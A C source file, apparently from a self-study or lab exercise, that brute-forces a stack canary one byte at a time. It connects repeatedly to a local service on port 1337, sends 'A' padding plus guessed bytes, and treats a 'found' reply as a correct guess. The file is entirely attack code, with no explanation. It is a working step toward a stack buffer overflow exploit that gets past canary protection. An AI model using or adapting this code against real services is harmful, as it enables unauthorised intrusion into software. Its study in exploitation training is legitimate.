#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "hacking.h"
#include <unistd.h>
#include <stdlib.h>
#include <math.h>

#define PORT 1337

			

int main ()
	{
	int clientSocket;
	struct sockaddr_in c_addr, s_addr;
	socklen_t size;
	char buffer1[128]="AAAAAAAA"; 
	char buffer2[1024];
	char can[16];
	int l, len_r=0;
	int x, yes=1;
	char a[3];
	int i,j,lr;
	int flag, length;
		
	s_addr.sin_family = AF_INET;		 
	s_addr.sin_port = htons(PORT);	 
	s_addr.sin_addr.s_addr = INADDR_ANY; 
	memset(&(s_addr.sin_zero), '\0', 8);	
	
	flag=8;
	length=9;
		
	
	int hex = 0x00;
	
	
	for(i=0; i<16; i++)
		{
		hex = 0x00;
		bzero(buffer2,1024);
		for	(j=0; j<256;j++)
			{	
			
			len_r=0;
			buffer1[flag]=(char)hex;
			
			if((clientSocket=socket(PF_INET, SOCK_STREAM, 0))== -1)
				fatal("In Socket");

			struct timeval tv;
			tv.tv_sec = 0;
			tv.tv_usec = 250000;
			setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);

			if(connect(clientSocket, (struct sockaddr *)&s_addr, sizeof(struct sockaddr)) == -1 )
				fatal("In connect");	
			
			x=send(clientSocket, buffer1, length, 0);		 
			
			
			len_r = read(clientSocket, buffer2 ,sizeof(buffer2)); 
			buffer2[len_r]=0;
			
			if(strcmp(buffer2,"found")==0)
				{
				printf("Found Canary %x \n",hex );
				break;
				}
			else
				{		
				hex++;	
				close(clientSocket);
				}	
			
			
			}
			flag++;
			length++;	
		}	

		close(clientSocket);		
			
	return 0;
	}
		
	
